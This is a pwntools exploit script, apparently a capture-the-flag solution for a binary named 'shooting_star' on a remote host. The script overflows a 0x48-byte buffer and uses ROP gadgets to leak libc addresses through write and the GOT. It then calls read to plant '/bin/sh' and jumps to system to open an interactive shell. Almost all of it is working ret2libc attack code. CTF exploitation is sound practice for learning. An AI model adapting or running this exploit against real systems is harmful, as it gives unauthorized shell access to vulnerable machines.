# Identified these libraries as potential use
# https://libc.blukat.me/?q=__libc_start_main%3A00007fd62dc10b10%2C__write%3A00007fd62dcff210

from pwn import *
import time

context.binary = './shooting_star'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

# Use write to leak out a value in the got table
# Once you get the got table value you can ret2libc it

HOST = '159.65.20.166'
PORT = 30078

def get_process():
  #proc = process()
  proc = remote(HOST, PORT)

  return proc

def attach_gdb(proc):
  gdb.attach(proc, gdbscript="""
  """)
  time.sleep(3)

f_star = p64(0x401142)
got_libc_main = p64(0x403ff0)
got_write = p64(0x404018)
got_read = p64(0x404020)
plt_write = p64(0x401030)
plt_read = p64(0x401040)

g_pop_rdi = p64(0x4012cb)
g_pop_rsi_pop_r15 = p64(0x4012c9)

offset = b'A' * 0x48

def get_libc_address(proc, label, address):
  payload = b''.join([
    offset,
    g_pop_rdi,
    p64(1), # stdout
    g_pop_rsi_pop_r15,
    address,
    p64(0),
    plt_write,
    f_star
  ])

  proc.sendlineafter(b'>>', payload)
  proc.recvuntil(b'May your wish come true!\n')
  write_address = proc.recv(8)[::-1].hex()
  print(f'{label}: {write_address}')
  return write_address

def main():
  proc = get_process()
  #attach_gdb(proc)


  offset = b'A'* 0x48

  proc.sendlineafter(b'Learn about the stars.', b'1')

  libc_main = get_libc_address(proc, "libc main", got_libc_main)
  libc_main = int(libc_main, 16)
  system = libc_main + 0x2da40

  #read(0,0x404008,xxx)

  payload = b''.join([
    offset,
    g_pop_rdi,
    p64(0),
    g_pop_rsi_pop_r15,
    p64(0x404008),
    p64(0),
    plt_read,
    g_pop_rdi,
    p64(0x404008),
    p64(system)
  ])

  proc.sendline(b'1')
  proc.sendlineafter(b'>>', payload)
  proc.sendline(b'/bin/sh\x00')
  proc.interactive()

if __name__ == '__main__':
  main()
